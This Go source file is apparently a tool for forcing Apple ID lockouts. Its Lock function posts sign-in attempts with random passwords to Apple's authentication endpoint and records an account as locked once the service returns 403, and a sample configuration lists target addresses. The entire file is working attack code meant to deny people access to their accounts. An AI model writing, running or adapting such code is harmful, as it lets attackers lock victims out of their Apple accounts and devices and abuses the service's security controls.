package lock

import (
	"bytes"
	"net/http"

	"github.com/Sirupsen/logrus"
)

type AppleID struct {
	ID    string `yml:"id"`
	State bool   `yml:"state:omitempty"`
}

func (appleID *AppleID) Lock(client *http.Client) error {
	req, err := http.NewRequest("POST", BaseURL+"/appleauth/auth/signin", bytes.NewBufferString(`{"accountName":"`+appleID.ID+`","rememberMe":true,"password":"`+RandString(8)+`"}`))
	if !CheckErr(err) {
		return err
	}

	setCommonHeader(req)

	resp, err := client.Do(req)
	if !CheckErr(err) {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusForbidden {
		logrus.Infof("Apple ID [%s] locked!", appleID.ID)
		appleID.State = true
		return nil
	}
	return nil
}

func ExampleConfig() []*AppleID {
	return []*AppleID{
		{
			ID: "apple1@apple.com",
		},
		{
			ID: "apple2@apple.com",
		},
	}
}
